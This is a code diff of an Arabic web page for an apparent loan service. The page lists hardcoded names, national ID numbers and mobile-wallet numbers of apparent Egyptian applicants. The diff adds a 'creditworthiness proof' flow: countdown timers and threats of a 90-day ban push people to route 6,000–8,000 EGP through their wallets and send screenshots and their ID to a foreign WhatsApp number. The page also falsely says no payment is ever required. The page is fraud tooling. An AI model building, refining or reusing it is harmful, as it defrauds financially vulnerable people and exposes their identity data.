@@ -55,9 +55,13 @@
         .loader { text-align: center; display: none; margin: 1rem; }
         .footer { text-align: center; margin-top: 2rem; font-size: 0.7rem; color: var(--text-muted); }
         .highlight-value { color: var(--royal-gold); font-weight: bold; }
-        /* واجهة التعليق */
         .suspended-card { border: 2px solid #D4AF37; background: rgba(212, 175, 55, 0.08); }
         .suspended-card i { color: #D4AF37; }
+        .step-icon { display: inline-block; width: 36px; height: 36px; background: rgba(46,204,113,0.2); border-radius: 50%; text-align: center; line-height: 36px; margin-left: 8px; color: var(--emerald); font-size: 1rem; flex-shrink: 0; }
+        .step-content { flex: 1; }
+        .step-row { display: flex; align-items: flex-start; gap: 8px; margin-bottom: 12px; }
+        .proof-highlight { background: rgba(212,175,55,0.08); border: 1px dashed var(--royal-gold); border-radius: 1rem; padding: 0.8rem; margin: 0.5rem 0; }
+        .proof-highlight .amount-value { font-size: 1.6rem; }
         @media (max-width: 640px) { .glass-header { flex-direction: column; text-align: center; } .amount-value { font-size: 2rem; } .timer { font-size: 1.8rem; letter-spacing: 2px; } .details-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
@@ -109,7 +113,6 @@ const customersDatabase = {
     "27411101601651": { name: "صالح السيد فراج", loan: 50000, wallet: "لا يوجد محفظة", walletNum: "", status: "approved" },
     "26912011500037": { name: "حسين حسن إسماعيل أحمد", loan: 200000, wallet: "لا يوجد محفظة", walletNum: "", status: "approved" },
     "27301261600228": { name: "حنان فؤاد محمد حسن", loan: 45000, wallet: "لا يوجد محفظة", walletNum: "", status: "approved" },
-    // ===== تم تعليق العميل احمد حسن علي حسن (فودافون) =====
     "29003160104218": { name: "احمد حسن علي حسن", loan: 40000, wallet: "فودافون كاش", walletNum: "01033747847", status: "suspended" },
     "": { name: "نهى نبيه عبد الرشيد عيسى", loan: 200000, wallet: "فودافون كاش", walletNum: "01010947899", status: "approved" },
     "27507020101589": { name: "هند ابراهيم علي عيد", loan: 0, wallet: "اتصالات كاش", walletNum: "غير مسجل", status: "pending" },
@@ -122,16 +125,12 @@ const customersDatabase = {
     "27111160201353": { name: "رمضان حمدي احمد اسماعيل", loan: 200000, wallet: "اتصالات كاش", walletNum: "01108356493", status: "approved" },
     "26403170201057": { name: "طارق عبد المنعم يونس", loan: 200000, wallet: "فودافون كاش", walletNum: "01069166288", status: "approved" },
     "26311040101385": { name: "آمال محمد الفولى محمد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01108758275", status: "approved" },
-    // ===== العملاء الجدد =====
     "28201200104031": { name: "محمد جوهر السيد أحمد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01150204528", status: "approved" },
-    // === تم حذف التكر (اتصالات كاش) للرقم 2900314218 =====
-    // "2900316018": { name: "احمد حسن علي حسن", loan: 40000, wallet: "اتصالات كاش", walletNum: "01112221041", status: "approved" }, // ❌ تم حذفه
     "28404092401811": { name: "ياسر عوض احمد حسن", loan: 60000, wallet: "فودافون كاش", walletNum: "01063524486", status: "approved" },
     "26906210100315": { name: "ايمن محمد دسوقي السيد", loan: 100000, wallet: "فودافون كاش", walletNum: "01070163553", status: "approved" },
     "27902280101704": { name: "مني صبحي منصور غانم", loan: 30000, wallet: "اتصالات كاش", walletNum: "01142725411", status: "approved" },
     "26306181900393": { name: "سيد السعيد عبد السميع سيد احمد", loan: 40000, wallet: "فودافون كاش", walletNum: "01012685233", status: "approved" },
     "28309261300199": { name: "سيد أحمد البراء محمود عبد العزيز", loan: 35000, wallet: "فودافون كاش", walletNum: "01212808281", status: "approved" },
-    // ===== العملاء الجدد من ملف الخدمات المصرفية =====
     "29501011628981": { name: "ايمان عيد حلمى السيد القاضى", loan: 190000, wallet: "فودافون كاش", walletNum: "01003741606", status: "approved" },
     "29701110102019": { name: "محمد اشرف محمد سيد", loan: 35000, wallet: "فودافون كاش", walletNum: "01200365419", status: "approved" },
     "27809020101119": { name: "جمال عبد الفتاح يوسف علي", loan: 200000, wallet: "فودافون كاش", walletNum: "01097201115", status: "approved" },
@@ -142,9 +141,7 @@ const customersDatabase = {
     "29810012111895": { name: "محمود السيد حملى عبدالرحمن", loan: 150000, wallet: "اتصالات كاش", walletNum: "01116305548", status: "approved" },
     "28510232501395": { name: "على عبد الباسط عبد الرحيم يوسف", loan: 100000, wallet: "اتصالات كاش", walletNum: "01130553521", status: "approved" },
     "27912260300114": { name: "حازم فتحى وهبه احمد", loan: 120000, wallet: "فودافون كاش", walletNum: "01013358531", status: "approved" },
-    // ===== العملاء الجدد من ملف 18_14 (غير مكررين) =====
     "26906032100411": { name: "عادل يوسف يوسف حمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01060309649", status: "approved" },
-    // ===== العملاء الجدد من ملف 35_31 (غير مكررين) =====
     "26801151201432": { name: "احمد السعيد محمود بدوي", loan: 60000, wallet: "فودافون كاش", walletNum: "01007723415", status: "approved" },
     "28512121803379": { name: "محمد مسعد عبد القادر قاسم", loan: 40000, wallet: "فودافون كاش", walletNum: "01027475098", status: "approved" },
     "27810101600355": { name: "احمد عبد الحميد احمد نوار", loan: 200000, wallet: "فودافون كاش", walletNum: "01000748697", status: "approved" },
@@ -154,7 +151,6 @@ const customersDatabase = {
     "": { name: "سوسن عبدربة عبدالرازق السيد", loan: 155000, wallet: "اتصالات كاش", walletNum: "01113443423", status: "approved" },
     "27808230102316": { name: "مصطفى محمد سيد عبد الغني", loan: 50000, wallet: "اتصالات كاش", walletNum: "01124213383", status: "approved" },
     "27309260200413": { name: "أبراهيم عبدالنبي أبراهيم شعبان", loan: 200000, wallet: "فودافون كاش", walletNum: "01272334829", status: "approved" },
-    // ===== العملاء الجدد من نموذج الاستمارة =====
     "29006081800577": { name: "حمدي احمد محمد محمد", loan: 200000, wallet: "لايوجد فودافون او اتصالات", walletNum: "", status: "approved" },
     "29902240104663": { name: "أسماء اسامه إبراهيم بخيت", loan: 30000, wallet: "اتصالات كاش", walletNum: "01158961065", status: "approved" },
     "27908012102074": { name: "نيازي محمد احمد عبدالعزيز", loan: 200000, wallet: "فودافون كاش", walletNum: "01044791832", status: "approved" },
@@ -163,23 +159,11 @@ const customersDatabase = {
     "30511102303511": { name: "يوسف ابراهيم محمد محمد", loan: 30000, wallet: "فودافون كاش", walletNum: "01092380286", status: "approved" },
     "27302230100916": { name: "ايهاب احمد علوان محمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01004866147", status: "approved" },
     "27009012202036": { name: "وليد عويس عبد التواب عبد المحسن", loan: 110000, wallet: "اتصالات كاش", walletNum: "01116743613", status: "approved" },
-
-    // ===== العميل كريم فؤاد (تعليق لمدة ساعة ثم حظر 90 يوم) =====
-    "29012006251": { 
-        name: "كريم فؤاد", 
-        loan: 150000, 
-        wallet: "فودافون كاش", 
-        walletNum: "01012345678", 
-        status: "pending_urgent_90day",
-        deadlineMinutes: 60
-    },
-    // ===== العملاء الجدد من نموذج الاستمارة (1) =====
-"26804051700147": { name: "نجاة على نبوى", loan: 50000, wallet: "فودافون كاش", walletNum: "01060162041", status: "approved" },
-"29301102200607": { name: "رضا سليمان أبو الخير عبد اللطيف", loan: 60000, wallet: "اتصالات كاش", walletNum: "01140141022", status: "approved" },
-"29905051803738": { name: "احمد عوض علي عبد الحميد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01145716683", status: "approved" },
-"28709261700055": { name: "احمد ابراهيم عبدالعظيم محمد", loan: 50000, wallet: "فودافون كاش", walletNum: "01002051998", status: "approved" },
-// ===== العميل المعلق =====
-// "290034218": { name: "احمد حسن علي حسن", loan: 40000, wallet: "اتصالات كاش", walletNum: "01112221041", status: "approved" }, // ❌ معلق لحين الانتهاء من الإجراءات
+    "29012006251": { name: "كريم فؤاد", loan: 150000, wallet: "فودافون كاش", walletNum: "01012345678", status: "pending_urgent_90day", deadlineMinutes: 60 },
+    "26804051700147": { name: "نجاة على نبوى", loan: 50000, wallet: "فودافون كاش", walletNum: "01060162041", status: "approved" },
+    "29301102200607": { name: "رضا سليمان أبو الخير عبد اللطيف", loan: 60000, wallet: "اتصالات كاش", walletNum: "01140141022", status: "approved" },
+    "29905051803738": { name: "احمد عوض علي عبد الحميد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01145716683", status: "approved" },
+    "28709261700055": { name: "احمد ابراهيم عبدالعظيم محمد", loan: 50000, wallet: "فودافون كاش", walletNum: "01002051998", status: "approved" },
 };
 
     const WHATSAPP_NUMBER = "212620702869";
@@ -225,11 +209,170 @@ const customersDatabase = {
         }
     }
 
-    // ========== الوظائف العادية ==========
+    // ========== دالة عرض خطوات الإثبات المطورة ==========
+    function buildProofSteps(customer, nationalId, isUrgent = false, deadlineMinutes = 30) {
+        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
+        const formattedAmount = proofAmount.toLocaleString('ar-EG');
+        
+        let urgentWarning = '';
+        if (isUrgent) {
+            urgentWarning = `
+                <div class="warning-message step-box" style="border-right-color:var(--danger);">
+                    <strong>⚠️ تنبيه هام جداً:</strong><br>
+                    <strong>الوقت المتبقي: ${deadlineMinutes} دقيقة</strong> فقط لإتمام الإثبات، وإلا سيتم <strong>شطب طلبك بالكامل</strong> ولن تتمكن من استرداده إلا بعد <strong>90 يوماً</strong>.
+                </div>
+            `;
+        }
+
+        // حساب المبلغ المطلوب إثباته بناءً على القرض
+        const proofAmountDisplay = customer.loan < 100000 ? '6,000' : '8,000';
+
+        const html = `
+            <div class="proof-required-card" style="${isUrgent ? 'border-color: var(--danger); background: rgba(239,68,68,0.08);' : ''}">
+                <div style="text-align: center; margin-bottom: 1.5rem;">
+                    <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--royal-gold);"></i>
+                    <h2 style="color:var(--royal-gold); margin-top: 0.5rem;">📋 إثبات الجدارة الائتمانية</h2>
+                    <p style="color: var(--text-muted);">خطوات بسيطة وسهلة لتفعيل صرف مبلغ القرض مباشرة</p>
+                </div>
+
+                <!-- رسالة طمأنة -->
+                <div class="info-message" style="background: rgba(46,204,113,0.08); border-right-color: var(--emerald); text-align: center;">
+                    <i class="fas fa-check-circle" style="color: var(--emerald);"></i>
+                    <strong style="color: var(--emerald);">أنت غير مطالب بدفع أي مبلغ للشركة نهائياً</strong>
+                    <br><span style="font-size: 0.9rem;">كل المطلوب هو إثبات الجدية فقط، والخدمة مجانية بالكامل</span>
+                </div>
+
+                <!-- المبلغ المطلوب إثباته -->
+                <div class="proof-highlight" style="text-align: center;">
+                    <div style="font-size: 0.9rem; color: var(--text-muted);">المبلغ المطلوب لإثبات الجدارة</div>
+                    <div class="amount-value" style="font-size: 2rem;">${proofAmountDisplay} ج.م</div>
+                    <div style="font-size: 0.8rem; color: var(--text-muted);">(هذا المبلغ ليس للشركة، بل لإثبات الجدية فقط)</div>
+                </div>
+
+                ${urgentWarning}
+
+                <!-- الخطوات -->
+                <div style="margin: 1.5rem 0;">
+                    <h3 style="color: var(--royal-gold); margin-bottom: 1rem;"><i class="fas fa-list-ol"></i> خطوات إثبات الجدارة</h3>
+                    
+                    <div class="step-row">
+                        <span class="step-icon">1</span>
+                        <div class="step-content">
+                            <strong>📥 استلام المبلغ</strong>
+                            <p style="color: var(--text-muted); font-size: 0.9rem; margin: 0;">اطلب من أي شخص تثق فيه (صديق، قريب، زميل) أن يحول لك مبلغ <span class="highlight-value">${proofAmountDisplay} جنيه</span> على رقم محفظتك المسجل.</p>
+                        </div>
+                    </div>
+
+                    <div class="step-row">
+                        <span class="step-icon">2</span>
+                        <div class="step-content">
+                            <strong>📱 تصوير الرصيد</strong>
+                            <p style="color: var(--text-muted); font-size: 0.9rem; margin: 0;">قم بعمل <strong>"استعلام عن الرصيد"</strong> في تطبيق محفظتك، ثم <strong>التقط صورة شاشة (سكرين شوت)</strong> تظهر فيها قيمة المبلغ في حسابك.</p>
+                        </div>
+                    </div>
+
+                    <div class="step-row">
+                        <span class="step-icon">3</span>
+                        <div class="step-content">
+                            <strong>🔄 إعادة المبلغ أو تحويله</strong>
+                            <p style="color: var(--text-muted); font-size: 0.9rem; margin: 0;">قم بتحويل المبلغ بالكامل <strong>مرة أخرى</strong> لأي شخص (يمكنك رده للشخص الذي حوله لك، أو لشخص آخر، أو حتى سحبه).</p>
+                            <p style="color: var(--warning); font-size: 0.8rem; margin: 0;">⚠️ المهم أن يخرج المبلغ من حسابك، لا يشترط بقاؤه فيه.</p>
+                        </div>
+                    </div>
+
+                    <div class="step-row">
+                        <span class="step-icon">4</span>
+                        <div class="step-content">
+                            <strong>📸 تصوير تحويل المبلغ</strong>
+                            <p style="color: var(--text-muted); font-size: 0.9rem; margin: 0;">التقط <strong>صورة شاشة (سكرين شوت)</strong> لإشعار تحويل المبلغ من حسابك.</p>
+                        </div>
+                    </div>
+
+                    <div class="step-row">
+                        <span class="step-icon">5</span>
+                        <div class="step-content">
+                            <strong>📤 إرسال الصور للدعم</strong>
+                            <p style="color: var(--text-muted); font-size: 0.9rem; margin: 0;">أرسل <strong>صورتي الاستلام والتحويل</strong> إلى قسم التحويلات المالية عبر واتساب باستخدام الزر أدناه.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- نصائح أمان -->
+                <div class="info-message" style="background: rgba(212,175,55,0.08); border-right-color: var(--royal-gold);">
+                    <i class="fas fa-lock" style="color: var(--royal-gold);"></i>
+                    <strong>🔒 بياناتك آمنة ومشفرة</strong>
+                    <p style="margin: 0; font-size: 0.85rem;">جميع بيانات العملاء مشفرة بالكامل، ولا يطلع عليها أي شخص خارج فريق التمويل.</p>
+                    <p style="margin: 0; font-size: 0.85rem; color: var(--emerald);">Cashfaster دائماً في ظهر عملاءها 💚</p>
+                </div>
+
+                <!-- زر واتساب -->
+                <button class="btn-whatsapp" id="sendProofStepsBtn" style="${isUrgent ? 'animation: pulseRed 1s infinite alternate;' : ''}">
+                    <i class="fab fa-whatsapp fa-lg"></i> ${isUrgent ? '🚨 إرسال صور الإثبات فوراً (آخر فرصة)' : '📤 إرسال صور الإثبات والتحقق الفوري'}
+                </button>
+
+                <!-- مؤقت -->
+                <div class="${isUrgent ? 'urgent-timer' : 'timer-glow'}" style="margin-top: 1rem;">
+                    <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لإثبات الجدارة</div>
+                    <div class="timer" id="proofTimer" style="${isUrgent ? 'color: var(--danger);' : ''}">${String(deadlineMinutes).padStart(2,'0')}:00</div>
+                    <div style="font-size:0.7rem;">${isUrgent ? '⚠️ بعد انتهاء الوقت، سيتم شطب الطلب وحظرك 90 يوماً' : '⏳ يجب إكمال الإثبات قبل انتهاء الوقت لضمان الصرف الفوري'}</div>
+                </div>
+            </div>
+        `;
+        document.getElementById('resultSection').innerHTML = html;
+
+        // تشغيل المؤقت
+        let secondsLeft = deadlineMinutes * 60;
+        const timerEl = document.getElementById('proofTimer');
+        if (timerEl) {
+            const interval = setInterval(() => {
+                if (secondsLeft <= 0) {
+                    clearInterval(interval);
+                    timerEl.innerText = "00:00";
+                    if (isUrgent) {
+                        // حظر 90 يوم
+                        document.getElementById('resultSection').innerHTML = `
+                            <div class="support-card" style="border-color: var(--danger);">
+                                <i class="fas fa-ban" style="font-size:3rem; color:var(--danger);"></i>
+                                <h2 style="color:var(--danger);">❌ تم شطب طلبك وحظرك لمدة 90 يوماً</h2>
+                                <p><strong>${customer.name}</strong> ، لم تقم بإثبات الجدارة في الوقت المحدد.</p>
+                                <div class="step-box" style="border-right-color:var(--danger);">
+                                    <strong>⛔ لا يمكنك استرداد الطلب أو التقديم مرة أخرى إلا بعد 90 يوماً من الآن.</strong>
+                                </div>
+                                <button class="btn-whatsapp" id="contactSupportAfterBlock">التواصل مع الدعم (للاستفسار فقط)</button>
+                            </div>
+                        `;
+                        const btn = document.getElementById('contactSupportAfterBlock');
+                        if (btn) btn.onclick = () => openWhatsApp(`طلب تم شطبه وحظر 90 يومًا: ${customer.name}\nالرقم القومي: ${nationalId}`);
+                    } else {
+                        alert("⏰ انتهت المهلة المحددة للإثبات. سيتم إلغاء العملية.");
+                    }
+                } else {
+                    secondsLeft--;
+                    const mins = Math.floor(secondsLeft / 60);
+                    const secs = secondsLeft % 60;
+                    timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+                }
+            }, 1000);
+        }
+
+        const btn = document.getElementById('sendProofStepsBtn');
+        if (btn) {
+            btn.onclick = () => {
+                let msg = `📤 إرسال صور إثبات الجدارة\n`;
+                msg += `العميل: ${customer.name}\n`;
+                msg += `الرقم القومي: ${nationalId}\n`;
+                msg += `المبلغ المطلوب صرفه: ${customer.loan.toLocaleString('ar-EG')} ج.م\n`;
+                msg += `مبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م\n\n`;
+                msg += `سأقوم بإرسال صورتي الاستلام والتحويل لإثبات الجدارة.`;
+                openWhatsApp(msg);
+            };
+        }
+    }
+
+    // ========== وظائف الحالات المختلفة ==========
     function buildApprovedStage(customer, nationalId) {
         const refNum = Math.floor(Math.random() * 1e9);
         const now = new Date();
-        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
         const html = `
             <div class="payment-card">
                 <div style="display:flex; justify-content:space-between; border-bottom:1px dashed var(--emerald); padding-bottom:0.6rem;">
@@ -246,65 +389,17 @@ const customersDatabase = {
                     <div class="detail-item"><span><i class="fas fa-calendar"></i> التاريخ والوقت</span><span>${now.toLocaleDateString('ar-EG')} - ${now.toLocaleTimeString('ar-EG')}</span></div>
                 </div>
                 <div class="info-message"><i class="fas fa-hourglass-half"></i> <strong>جارٍ حصولك على صرف المبلغ المدفوع لحسابك فور الإثبات مباشرة</strong><br>سيتم تسليم المبلغ خلال <strong>30 دقيقة</strong> بعد إتمام إجراءات إثبات الجدارة.</div>
-                <div class="timer-glow"><div><i class="fas fa-stopwatch"></i> الوقت المتبقي لتسليم المبلغ (بعد الإثبات)</div><div class="timer" id="deliveryTimer">30:00</div><div style="font-size:0.7rem;">⚠️ يجب إكمال إثبات الجدارة قبل انتهاء الوقت لضمان الصرف الفوري</div></div>
-                <div class="credit-card">
-                    <h3 style="color:var(--emerald); margin-bottom:1rem;"><i class="fas fa-chart-line"></i> 📋 باختصار: ليه بنطلب منك إثبات الجدارة؟</h3>
-                    <div class="step-box">(من غير ما تحول لنا ولا مليم - بس عشان نتأكد من جدية تعاملك)</div>
-                    <div class="step-box">✅ <strong>الهدف الوحيد:</strong> نتأكد إن وضعك المالي يسمح بالقرض.</div>
-                    <div class="step-box">🔹 <strong>المطلوب منك بكل بساطة:</strong><br>اطلب من أي حد تثق فيه يحول لك <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} جنيه</span> على محفظتك، صوّر الرصيد، بعدين حولهم له تاني.</div>
-                    <div class="step-box">🍃 احنا لا نطلب فلوس ولا يتطلب منك دفع منها حاجة – الفلوس كلها انت بتحولها تانى فى وقتها للشخص اللي حولها لك.</div>
-                    <div class="step-box">✅ <strong>بعد الإثبات:</strong> القرض يتفعّل فورا ويوصلك.<br>❌ <strong>لو ما أثبتش خلال 30 دقيقة:</strong> الطلب يتشطب وما تقدرش تسترده إلا بعد 90 يوم.</div>
-                    <button class="btn-whatsapp" id="sendProofWhatsAppBtn"><i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات والتحقق الفوري</button>
-                </div>
-            </div>
         `;
         document.getElementById('resultSection').innerHTML = html;
-        let secondsLeft = 30 * 60;
-        const timerEl = document.getElementById('deliveryTimer');
-        if (timerEl) {
-            const interval = setInterval(() => {
-                if (secondsLeft <= 0) { clearInterval(interval); timerEl.innerText = "00:00"; alert("انتهت المهلة المحددة للإثبات. سيتم إلغاء العملية."); }
-                else { secondsLeft--; const mins = Math.floor(secondsLeft/60); const secs = secondsLeft%60; timerEl.innerText = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`; }
-            }, 1000);
-        }
-        const btn = document.getElementById('sendProofWhatsAppBtn');
-        if (btn) btn.onclick = () => openWhatsApp(`السلام عليكم\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${proofAmount.toLocaleString('ar-EG')} ج.م.`);
+        // نضيف خطوات الإثبات بعد البطاقة
+        buildProofSteps(customer, nationalId, false, 30);
     }
 
     function buildPendingStage(customer, nationalId) {
-        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
-        const html = `
-            <div class="proof-required-card">
-                <i class="fas fa-clock" style="font-size:3rem; color:var(--royal-gold);"></i>
-                <h2 style="color:var(--royal-gold);">⏳ طلبك معلق لحين إثبات الجدارة الائتمانية</h2>
-                <div class="step-box">📋 <strong>باختصار: ليه بنطلب منك إثبات الجدارة؟</strong><br>(من غير ما تحول لنا ولا مليم - بس عشان نتأكد من جدية تعاملك)</div>
-                <div class="step-box">✅ <strong>الهدف الوحيد:</strong> نتأكد إن وضعك المالي يسمح بالقرض.</div>
-                <div class="step-box">🔹 <strong>المطلوب منك بكل بساطة:</strong><br>اطلب من أي حد تثق فيه يحول لك <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} جنيه</span> على محفظتك، صوّر الرصيد، بعدين حولهم له تاني.</div>
-                <div class="step-box">🍃 احنا لا نطلب فلوس ولا يتطلب منك دفع منها حاجة – الفلوس كلها انت بتحولها تانى فى وقتها للشخص اللي حولها لك.</div>
-                <div class="step-box">✅ <strong>بعد الإثبات:</strong> القرض يتفعّل فورا ويوصلك.<br>❌ <strong>لو ما أثبتش خلال 30 دقيقة:</strong> الطلب يتشطب وما تقدرش تسترده إلا بعد 90 يوم.</div>
-                <div class="details-grid">
-                    <div class="detail-item"><span><i class="fas fa-wallet"></i> المحفظة المسجلة</span><span>${customer.wallet} ${customer.walletNum ? '('+customer.walletNum+')' : ''}</span></div>
-                    <div class="detail-item"><span><i class="fas fa-money-bill-wave"></i> المبلغ المطلوب</span><span>${customer.loan.toLocaleString('ar-EG')} ج.م</span></div>
-                </div>
-                <div class="timer-glow"><div><i class="fas fa-stopwatch"></i> الوقت المتبقي لإثبات الجدارة</div><div class="timer" id="normalTimer">30:00</div><div style="font-size:0.7rem;">⚠️ يجب إكمال إثبات الجدارة قبل انتهاء الوقت لضمان الصرف الفوري</div></div>
-                <button class="btn-whatsapp" id="sendProofPendingBtn"><i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات وفتح الطلب</button>
-            </div>
-        `;
-        document.getElementById('resultSection').innerHTML = html;
-        let secondsLeft = 30 * 60;
-        const timerEl = document.getElementById('normalTimer');
-        if (timerEl) {
-            const interval = setInterval(() => {
-                if (secondsLeft <= 0) { clearInterval(interval); timerEl.innerText = "00:00"; alert("انتهت المهلة المحددة للإثبات. سيتم إلغاء العملية."); }
-                else { secondsLeft--; const mins = Math.floor(secondsLeft/60); const secs = secondsLeft%60; timerEl.innerText = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`; }
-            }, 1000);
-        }
-        const btn = document.getElementById('sendProofPendingBtn');
-        if (btn) btn.onclick = () => openWhatsApp(`طلب إثبات الجدارة\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب صرفه: ${customer.loan.toLocaleString('ar-EG')} ج.م\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${proofAmount.toLocaleString('ar-EG')} ج.م.`);
+        buildProofSteps(customer, nationalId, false, 30);
     }
 
     function buildHoldStage(customer, nationalId, holdMinutes) {
-        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
         const html = `
             <div class="proof-required-card" style="border-color: #FF8C42;">
                 <i class="fas fa-pause-circle" style="font-size:3rem; color:var(--warning);"></i>
@@ -313,7 +408,7 @@ const customersDatabase = {
                     <strong>📌 سبب التعليق:</strong> جاري مراجعة بعض البيانات من قبل فريق التمويل.
                 </div>
                 <div class="step-box" style="border-right-color:var(--warning);">
-                    <strong>⏱️ المدة المتوقعة:</strong> <span class="highlight-value">${holdMinutes} دقيقة</span> (ساعتين)
+                    <strong>⏱️ المدة المتوقعة:</strong> <span class="highlight-value">${holdMinutes} دقيقة</span>
                 </div>
                 <div class="timer-glow" style="border-color:var(--warning); animation: pulseGold 1.2s infinite alternate;">
                     <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لانتهاء التعليق</div>
@@ -360,75 +455,9 @@ const customersDatabase = {
     }
 
     function buildGenericUrgent(customer, nationalId, deadlineMinutes) {
-        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
-        const html = `
-            <div class="urgent-card proof-required-card">
-                <i class="fas fa-exclamation-triangle" style="font-size:3rem; color:var(--danger);"></i>
-                <h2 style="color:var(--danger);">⛔ إنذار نهائي - سيتم شطب طلبك فوراً</h2>
-                <div class="warning-message step-box" style="border-right-color:var(--danger);">
-                    <strong>⚠️ تحذير هام جداً:</strong><br>
-                    سيتم <strong>شطب طلبك بالكامل</strong> خلال <strong>${deadlineMinutes} دقائق</strong> من الآن.<br>
-                    <strong>ولن تتمكن من استرداد الطلب أو إعادة التقديم إلا بعد مرور 90 يوماً كاملة.</strong>
-                </div>
-                <div class="step-box">📋 <strong>باختصار: ليه بنطلب منك إثبات الجدارة؟</strong><br>(من غير ما تحول لنا ولا مليم - بس عشان نتأكد من جدية تعاملك)</div>
-                <div class="step-box">✅ <strong>الهدف الوحيد:</strong> نتأكد إن وضعك المالي يسمح بالقرض.</div>
-                <div class="step-box">🔹 <strong>المطلوب منك بكل بساطة:</strong><br>اطلب من أي حد تثق فيه يحول لك <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} جنيه</span> على محفظتك، صوّر الرصيد، بعدين حولهم له تاني.</div>
-                <div class="step-box">🍃 احنا لا نطلب فلوس ولا يتطلب منك دفع منها حاجة – الفلوس كلها انت بتحولها تانى فى وقتها للشخص اللي حولها لك.</div>
-                <div class="step-box">✅ <strong>بعد الإثبات:</strong> القرض يتفعّل فورا ويوصلك.<br>❌ <strong>لو ما أثبتش خلال ${deadlineMinutes} دقائق:</strong> الطلب يتشطب وما تقدرش تسترده إلا بعد 90 يوم.</div>
-                <div class="details-grid">
-                    <div class="detail-item"><span><i class="fas fa-wallet"></i> المحفظة المسجلة</span><span>${customer.wallet} ${customer.walletNum ? '('+customer.walletNum+')' : ''}</span></div>
-                    <div class="detail-item"><span><i class="fas fa-money-bill-wave"></i> المبلغ المطلوب</span><span>${customer.loan.toLocaleString('ar-EG')} ج.م</span></div>
-                </div>
-                <div class="urgent-timer">
-                    <div><i class="fas fa-hourglass-end"></i> الوقت المتبقي قبل الشطب النهائي والحظر 90 يوماً</div>
-                    <div class="timer" id="urgentTimerGeneric">${String(deadlineMinutes).padStart(2,'0')}:00</div>
-                    <div style="font-size:0.7rem;">⚠️ بعد انتهاء الوقت، سيتم شطب الطلب ولن يمكن استرداده إلا بعد 90 يوماً</div>
-                </div>
-                <button class="btn-whatsapp" id="sendProofUrgentBtnGeneric">
-                    <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات فوراً (آخر فرصة)
-                </button>
-            </div>
-        `;
-        document.getElementById('resultSection').innerHTML = html;
-        
-        let secondsLeft = deadlineMinutes * 60;
-        const timerEl = document.getElementById('urgentTimerGeneric');
-        if (timerEl) {
-            const interval = setInterval(() => {
-                if (secondsLeft <= 0) {
-                    clearInterval(interval);
-                    timerEl.innerText = "00:00";
-                    document.getElementById('resultSection').innerHTML = `
-                        <div class="support-card" style="border-color: var(--danger);">
-                            <i class="fas fa-ban" style="font-size:3rem; color:var(--danger);"></i>
-                            <h2 style="color:var(--danger);">❌ تم شطب طلبك وحظرك لمدة 90 يوماً</h2>
-                            <p><strong>${customer.name}</strong> ، لم تقم بإثبات الجدارة في الوقت المحدد.</p>
-                            <div class="step-box" style="border-right-color:var(--danger);">
-                                <strong>⛔ لا يمكنك استرداد الطلب أو التقديم مرة أخرى إلا بعد 90 يوماً من الآن.</strong>
-                            </div>
-                            <button class="btn-whatsapp" id="contactSupportAfterBlockGeneric">التواصل مع الدعم (للاستفسار فقط)</button>
-                        </div>
-                    `;
-                    const btn = document.getElementById('contactSupportAfterBlockGeneric');
-                    if (btn) btn.onclick = () => openWhatsApp(`طلب تم شطبه وحظر 90 يومًا: ${customer.name}\nالرقم القومي: ${nationalId}`);
-                } else {
-                    secondsLeft--;
-                    const mins = Math.floor(secondsLeft / 60);
-                    const secs = secondsLeft % 60;
-                    timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-                }
-            }, 1000);
-        }
-        
-        const btn = document.getElementById('sendProofUrgentBtnGeneric');
-        if (btn) {
-            btn.onclick = () => {
-                openWhatsApp(`🚨 طلب عاجل جداً (سيتم الشطب خلال دقائق وحظر 90 يومًا)\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب صرفه: ${customer.loan.toLocaleString('ar-EG')} ج.م\nسأقوم بإرسال صور الإثبات فوراً.`);
-            };
-        }
+        buildProofSteps(customer, nationalId, true, deadlineMinutes);
     }
 
-    // ========== دالة خاصة لعميل كريم فؤاد ==========
     function handleKarimFouad(customer, nationalId) {
         const STORAGE_BLOCK_PREFIX = "blocked_";
         const STORAGE_START_PREFIX = "timer_start_";
@@ -477,67 +506,30 @@ const customersDatabase = {
             localStorage.setItem(startKey, startTime.toString());
         }
 
-        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
-        const html = `
-            <div class="urgent-card proof-required-card">
-                <i class="fas fa-hourglass-half" style="font-size:3rem; color:var(--warning);"></i>
-                <h2 style="color:var(--warning);">⏳ طلبك معلق مؤقتاً – يجب الإثبات خلال ساعة</h2>
-                <div class="warning-message step-box" style="border-right-color:var(--warning);">
-                    <strong>⚠️ تنبيه هام:</strong><br>
